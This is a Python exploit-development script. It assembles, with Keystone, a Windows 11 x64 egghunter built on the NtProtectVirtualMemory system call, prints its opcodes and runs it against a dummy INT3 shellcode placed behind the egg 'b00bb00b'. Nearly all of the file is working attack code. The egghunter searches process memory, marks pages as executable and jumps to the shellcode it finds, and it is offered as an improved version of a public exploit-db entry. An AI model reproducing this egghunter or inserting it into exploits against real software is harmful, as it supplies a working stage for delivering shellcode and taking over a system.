#!/usr/bin/python
#
# Windows 11 x64 Egghunter based on the NtProtectVirtualMemory system call
#
# This Egghunter is based on: https://www.exploit-db.com/exploits/41827
#
# Improvements to the original implementation:
# 1. Correction of the scan using SCASD: the original implementation checked only for half of the egg, and execution landed in the second part of it.
# 2. Integration in a Keystone Build / Test script allowing to compile the assembly, display the opcodes, and test it with dummy sellcode
# 3. Comments have been improved
#
# Operation:
# This egghunter iterates the virtual memory addresses and, before searching for the egg, it performs a NtProtectVirtualMemory system call.
# This system call is similar to VirtualProtect, and is parameterized to set the memory to be scanned to READ, WRITE, EXECUTE.
# This way, when the egg is found, the shellcode after it is guaranteed to be executable.

import socket
import sys
from struct import pack
from ctypes import *
from keystone import *


egghunter_x64_NtProtectVirtualMemory = (
    "start:                           "
    "   push 0x7F;                    " # RDI is nonvolatile, so it will be preserved after syscalls
    "   pop rdi;                      " # Start searching from address 0x7f + 1

    "setup:                           "
    "   inc rdi;                      " # Current Address = Parameter lpAddress of the syscall
    "   mov r9b, 0x40;                " # R9 = Parameter flNewProtect = 0x40 = PAGE_EXECUTE_READWRITE
    "   pop rsi;                      " # Stack alignment before setup
    "   pop rsi;                      "
    "   push rdi;                     " # Push lpAddress = Current Address onto the stack
    "   push rsp;                     "
    "   pop rdx;                      " # RDX = address of lpAddress
    "   push 16;                      " # Push dwSize = 16 onto the stack
    "   push rsp;                     " 
    "   pop r8;                       " # R8 = address of dwSize
    "   mov [rdx+0x20], rsp;          " # Parameter lpflOldProtect (output). Note: this parameter is on the stack!
                                        # Parameters in the x64 Syscall calling convention: R10, RDX, R8, R9, stack
    "   dec r10;                      " # Paramter hProcess = -1 = Current Process. At this point R10 is always = 0.

    "NtProtectVirtualMemory:          "
    "   push 0x50;                    " # Syscall Number of NtProtectVirtualMemory 
    "   pop rax;                      " # RAX = Syscall Number
    "   syscall;                      " # Issue the system call
    "   cmp al, 0x01;                 " # Examine the return value of the system call
    "   jge setup;                    " # retry if needed

    "scan:                            "
    "   mov eax, 0x62303062;          " # Egg marker = b00b
    "   scasd;                        " # Scan for first half of egg
    "   jnz setup;                    " # If not found, continue scanning
    "   scasd;                        " # Scan for second half of egg
    "   jnz setup;                    " # If not found, continue scanning
    "   jmp rdi;                      " # Jump to shellcode when egg is found
)

ks = Ks(KS_ARCH_X86, KS_MODE_64)

# Generation of syscall-based Egghunter
encoding, count = ks.asm(egghunter_x64_NtProtectVirtualMemory)
egghunter_hexstr = ""
for dec in encoding: 
  egghunter_hexstr += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print(f"Egghunter (NtProtectVirtualMemory): {egghunter_hexstr}")

sh = b""
for e in encoding:
    sh += pack("B", e)
egghunter = bytearray(sh)

# Allocate and copy a dummy shellcode (not yet executable!) with the egg in front of it
shellcode = b"b00bb00b" + b"\xcc" * 100
memory_shellcode = windll.kernel32.VirtualAlloc(0x20000000, len(shellcode), 0x3000, 0x4)  # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
print(f"Allocated {len(shellcode)} bytes of shellcode memory at {c_uint64(memory_shellcode).value:#018x}")
buf = (c_char * len(shellcode)).from_buffer_copy(shellcode)
windll.kernel32.RtlMoveMemory(memory_shellcode, buf, len(shellcode))

# Allocate executable memory for the egghunter
memory_egghunter = windll.kernel32.VirtualAlloc(0x10000000, len(egghunter), 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

if not memory_egghunter:
    raise RuntimeError("VirtualAlloc failed!")

print(f"Allocated {len(egghunter)} bytes of egghunter memory at {c_uint64(memory_egghunter).value:#018x}")

# Copy shellcode in the allocated read/write memory (not yet executable!)
buf = (c_char * len(egghunter)).from_buffer_copy(egghunter)
windll.kernel32.RtlMoveMemory(memory_egghunter, buf, len(egghunter))

input("\n[?] Press Enter to execute the egghunter: ")

# Execute the egghunter in a new thread. The egghunter searches for the egg and sets memory to PAGE_EXECUTE_READWRITE
ht = windll.kernel32.CreateThread(
    None, 0, c_void_p(memory_egghunter), None, 0, pointer(c_int(0))
)

if not ht:
    raise RuntimeError("CreateThread failed!")

# Wait for thread termination
windll.kernel32.WaitForSingleObject(ht, -1)